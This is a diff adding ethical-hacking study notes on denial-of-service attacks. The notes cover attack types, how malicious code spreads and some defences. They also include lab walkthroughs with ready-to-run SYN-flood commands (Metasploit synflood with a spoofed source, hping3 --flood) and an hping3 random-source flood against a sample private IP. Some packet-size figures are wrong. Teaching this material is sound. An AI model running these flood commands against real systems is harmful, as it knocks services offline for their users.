@@ -1,0 +1,205 @@
+
+#--------------------------Denial Of Service Investigation---------------------#
+
+Denial Of Service(DOS):-
+------------------------------------
+A Denial of Service (DoS) is a type of attack on a service that disrupts its normal function and prevents other users from accessing it. The most common target for a DoS attack is an online service such as a website, though attacks can also be launched against networks, machines or even a single program.
+
+Link:- https://www.youtube.com/watch?v=xdd505iOmDg&ab_channel=Cloudflare
+
+
+Types of DoS & DDoS Attack:-
+--------------------------------------------
+DoS and DDoS attacks can be divided into three types.
+
+1. Volume Based Attacks:-
+    ------------------------------------
+     Includes UDP floods, ICMP floods, and other spoofed-packet floods. The attack’s goal is to saturate the bandwidth of the attacked site, and magnitude is measured in bits per second (Bps).
+
+2. Protocol Attacks:-
+    ----------------------------
+     Includes SYN floods, fragmented packet attacks, Ping of Death, Smurf DDoS and more. This type of attack consumes actual server resources, or those of intermediate communication equipment, such as firewalls and load balancers, and is measured in packets per second (Pps).
+
+3. Application Layer Attacks:-
+    ----------------------------------------
+     Includes low-and-slow attacks, GET/POST floods, attacks that target Apache, Windows or OpenBSD vulnerabilities and more. Comprised of seemingly legitimate and innocent requests, the goal of these attacks is to crash the web server, and the magnitude is measured in Requests per second (Rps).
+
+
+
+Propagation of Malicious Codes:-
+------------------------------------------------
+There are three most commonly used malicious code propagation methods.
+	1. Central Source Propagation(Publicity)
+	2. Back-Chaining Propagation(Publicity)
+	3. Autonomous Propagation
+
+
+Central Source Propagation:-
+------------------------------------------
+It Requires central source where attack toolkit is installed. when an attacker exploits the vulnerability machine, it opens the connection on infected system listening for file tranfer.
+File Transfereing mechanism that is used for tranferring Malicious Code(toolkit) is nomally, HTTP, FTP, RPC.
+
+
+Back-Chaining Propagation:-
+-----------------------------------------
+Back-Chaining Propagation requires attack toolkit installed on attacker's machine. When an attacker exploits the vulnerable machine. It Opens the connection on infected system listening for file transfer.  Then the toolkit is copied from the attacker. Once toolkit is installed on the infected system, it will search for other vulnerable system and the process continues.
+
+
+Autonomous Propagation:-
+------------------------------------------
+In this process the attacker exploits & send malicious code to the vulnerable system. The toolkit is installed & search for other vulnerable systems. Unlike Central Source Propagation, it does not require any Central Sourcce or planning toolkit on own system. 
+
+
+
+#------------------------------------------------------------------------------------------------#
+
+SYN Flooding Attack using Metasploit:-
+---------------------------------------------------------
+
+Machines:-
+	1. Attacker Machine:- Kali
+	2. Victim Machine:- Windows 7
+
+Tools:-
+-----------
+	1. Nmap
+	2. Metasploit
+
+Commands:-
+--------------------
+#nmap -p 21 192.168.1.132
+#msfconsole
+#use auxiliary/dos/tcp/synflood
+#show options
+#set RHOST <victim ip address>
+#set RPORT 21
+#set SHOST <spoofable ip address>
+#set TIMEOUT 30000
+#exploit
+
+==>Open Victim Machine & Check/Observe the Utilities Performance Graph
+==>Open wireshark and set TCP Packet Filter
+
+
+SYN Flooding Attack using Hping3:-
+----------------------------------------------------
+
+Machines:-
+	1. Attacker Machine:- Kali
+	2. Victim Machine:- Windows 7
+
+Tools:-
+	1. Hping3
+
+Commands:-
+--------------------
+#hping3 <victim ip address> --flood
+
+==>Open Victim Machine & Check/Observe the Utilities Performance Graph
+==>Open wireshark and set TCP Packet Filter
+
+
+#------------------------------------------------------------------------------------------------#
+
+
+Distributed Denial Of Service(DDOS):-
+------------------------------------------------------- 
+A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic. DDoS attacks achieve effectiveness by utilizing multiple compromised computer systems as sources of attack traffic. 
+
+
+Link:- https://www.youtube.com/watch?v=OhA9PAfkJ10
+Link:- https://www.youtube.com/watch?v=yLbC7G71IyE
+
+
+DoS vs. DDoS:-
+-----------------------
+The differences between regular and distributed denial of service assaults are substantive. In a DoS attack, a perpetrator uses a single Internet connection to either exploit a software vulnerability or flood a target with fake requests—usually in an attempt to exhaust server resources (e.g., RAM and CPU).
+
+On the other hand, distributed denial of service (DDoS) attacks are launched from multiple connected devices that are distributed across the Internet. These multi-person, multi-device barrages are generally harder to deflect, mostly due to the sheer volume of devices involved. Unlike single-source DoS assaults, DDoS attacks tend to target the network infrastructure in an attempt to saturate it with huge volumes of traffic.
+
+
+Common DDoS attacks types:-
+----------------------------------------------
+1. UDP Flood:-
+    -------------------
+A UDP flood, by definition, is any DDoS attack that floods a target with User Datagram Protocol (UDP) packets. The goal of the attack is to flood random ports on a remote host. This causes the host to repeatedly check for the application listening at that port, and (when no application is found) reply with an ICMP ‘Destination Unreachable’ packet. This process saps host resources, which can ultimately lead to inaccessibility.
+
+2. ICMP (Ping) Flood:-
+    ------------------------------
+Similar in principle to the UDP flood attack, an ICMP flood overwhelms the target resource with ICMP Echo Request (ping) packets, generally sending packets as fast as possible without waiting for replies. This type of attack can consume both outgoing and incoming bandwidth, since the victim’s servers will often attempt to respond with ICMP Echo Reply packets, resulting a significant overall system slowdown.
+
+3. SYN Flood:-
+    -------------------
+A SYN flood DDoS attack exploits a known weakness in the TCP connection sequence (the “three-way handshake”), wherein a SYN request to initiate a TCP connection with a host must be answered by a SYN-ACK response from that host, and then confirmed by an ACK response from the requester. In a SYN flood scenario, the requester sends multiple SYN requests, but either does not respond to the host’s SYN-ACK response, or sends the SYN requests from a spoofed IP address. Either way, the host system continues to wait for acknowledgement for each of the requests, binding resources until no new connections can be made, and ultimately resulting in denial of service.
+
+4 .Ping of Death:-
+    -----------------------
+A ping of death (“POD”) attack involves the attacker sending multiple malformed or malicious pings to a computer. The maximum packet length of an IP packet (including header) is 65,535 bytes. However, the Data Link Layer usually poses limits to the maximum frame size – for example 1500 bytes over an Ethernet network. In this case, a large IP packet is split across multiple IP packets (known as fragments), and the recipient host reassembles the IP fragments into the complete packet. In a Ping of Death scenario, following malicious manipulation of fragment content, the recipient ends up with an IP packet which is larger than 65,535 bytes when reassembled. This can overflow memory buffers allocated for the packet, causing denial of service for legitimate packets.
+
+				<OR>
+
+A Ping of Death attack is a denial-of-service (DoS) attack, in which the attacker aims to disrupt a targeted machine by sending a packet larger than the maximum allowable size, causing the target machine to freeze or crash. The original Ping of Death attack is less common today. A related attack known as an ICMP flood attack is more prevalent.
+
+
+How does a Ping of Death work:-
+--------------------------------------------------
+An Internet Control Message Protocol (ICMP) echo-reply message or “ping”, is a network utility used to test a network connection, and it works much like sonar – a “pulse” is sent out and the “echo” from that pulse tells the operator information about the environment. If the connection is working, the source machine receives a reply from the targeted machine.
+
+While some ping packets are very small, IP4 ping packets are much larger, and can be as large as the maximum allowable packet size of 65,535 bytes. Some TCP/IP systems were never designed to handle packets larger than the maximum, making them vulnerable to packets above that size.
+
+When a maliciously large packet is transmitted from the attacker to the target, the packet becomes fragmented into segments, each of which is below the maximum size limit. When the target machine attempts to put the pieces back together, the total exceeds the size limit and a buffer overflow can occur, causing the target machine to freeze, crash or reboot.
+
+Note:-Attacker Sends Malicious Packets larger than 110,000 bytes to victim
+Normal Packet Size 65538 bytes
+
+5. Slowloris:-
+    -------------------
+Slowloris is a highly-targeted attack, enabling one web server to take down another server, without affecting other services or ports on the target network. Slowloris does this by holding as many connections to the target web server open for as long as possible. It accomplishes this by creating connections to the target server, but sending only a partial request. Slowloris constantly sends more HTTP headers, but never completes a request. The targeted server keeps each of these false connections open. This eventually overflows the maximum concurrent connection pool, and leads to denial of additional connections from legitimate clients.
+
+6. NTP Amplification:-
+    ------------------------------
+In NTP amplification attacks, the perpetrator exploits publically-accessible Network Time Protocol (NTP) servers to overwhelm a targeted server with UDP traffic. The attack is defined as an amplification assault because the query-to-response ratio in such scenarios is anywhere between 1:20 and 1:200 or more. This means that any attacker that obtains a list of open NTP servers (e.g., by a using tool like Metasploit or data from the Open NTP Project) can easily generate a devastating high-bandwidth, high-volume DDoS attack.
+
+7. HTTP Flood:-
+    --------------------
+In an HTTP flood DDoS attack, the attacker exploits seemingly-legitimate HTTP GET or POST requests to attack a web server or application. HTTP floods do not use malformed packets, spoofing or reflection techniques, and require less bandwidth than other attacks to bring down the targeted site or server. The attack is most effective when it forces the server or application to allocate the maximum resources possible in response to every single request.
+
+
+DDOS Ping of Death Attack using Hping3:-
+--------------------------------------------------------------
+
+HPING 3:-
+----------------- It is a network tool, which is used for crafting the packets, testing the firewall, digital footprinting and much more. 
+
+#hping3 192.168.195.183 -c 10000000000 -d 999999999 --rand-source --flood -p 3306
+
+Check the site status after DDOS:-  https://isitdown.us/
+			          https://www.isitdownrightnow.com/
+
+#------------------------------------------------------------------------------------------------#
+
+
+Defending Against a DoS Attack:-
+--------------------------------------------------
+The threat of being targeted by DoS attacks have lead many major online services to implement various strategies for handling overwhelming floods of data or traffic.
+
+Some of the anti-DoS techniques:-
+---------------------------------------------------
+	1. Traffic analysis and filtering
+	2. Sinkholing
+	3. IP-based Prevention
+
+Traffic analysis and filtering:-
+------------------------------------------
+Traffic analysis is the process of monitoring network protocols and the data that streams through them within a network. 
+
+Sinkholing:-
+------------------
+Sinkholing is the redirection of traffic from its original destination to one specified by the sinkhole owners. The altered destination is known as the sinkhole. (The name is a reference to a physical sinkhole, into which items apparently disappear.) Sinkholes can be used for good or ill intent.
+
+Link:- https://www.youtube.com/watch?v=mf6OMPNfLN8
+Link:- https://www.youtube.com/watch?v=yPNKQZar-Fw&ab_channel=HackerSploit
+
+IP-based Prevention:-
+--------------------------------
+An intrusion prevention system (IPS) is a form of network security that works to detect and prevent identified threats. Intrusion prevention systems continuously monitor your network, looking for possible malicious incidents and capturing information about them.
